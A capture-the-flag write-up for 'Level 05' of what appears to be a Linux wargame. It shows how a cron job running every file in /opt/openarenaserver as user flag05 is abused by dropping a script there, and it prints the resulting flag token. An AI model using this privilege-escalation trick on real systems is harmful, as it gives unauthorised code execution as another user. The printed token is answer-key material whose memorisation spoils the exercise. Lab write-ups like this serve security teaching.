# Level 05

## Resolution

Once we log-in, we get a notification.

```shell
  You have new mail.
```

> Linux distributions usually store their mails under `/var/mail`.

So we simply have to `cat` the latest mail sent to user `level05`.

```shell
  $> cat /var/mail/level05
  */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

This mail is a [cron](https://en.wikipedia.org/wiki/Cron) job report. As explained in the mail, the script `/usr/sbin/openarenaserver` is runned as user `flag05` every 2 minutes.

The executed script is the following:

```shell
  $> cat /usr/sbin/openarenaserver

  #!/bin/sh

  for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
  done
```

> This script will look for every file in `/opt/openarenaserver` and try to execute them before deletion.

Knowing that `cron` run jobs in background and that this script is executed as user `flag05`, all we have to do is to write a script that output the result of `getflag` to a readable file.

```shell
  $> echo "getflag > /tmp/flag" > /opt/openarenaserver/getflag
```

Wait for the job to be triggered by checking the content of `/opt/openarenaserver` with `ls`. Once the file disappear, simply cat the output file and get the flag.

```shell
  $> cat /tmp/flag
  Check flag.Here is your token : viuaaale9huek52boumoomioc
```
So, `viuaaale9huek52boumoomioc` is the flag for this level.

## Ressources

- [cron](https://en.wikipedia.org/wiki/Cron)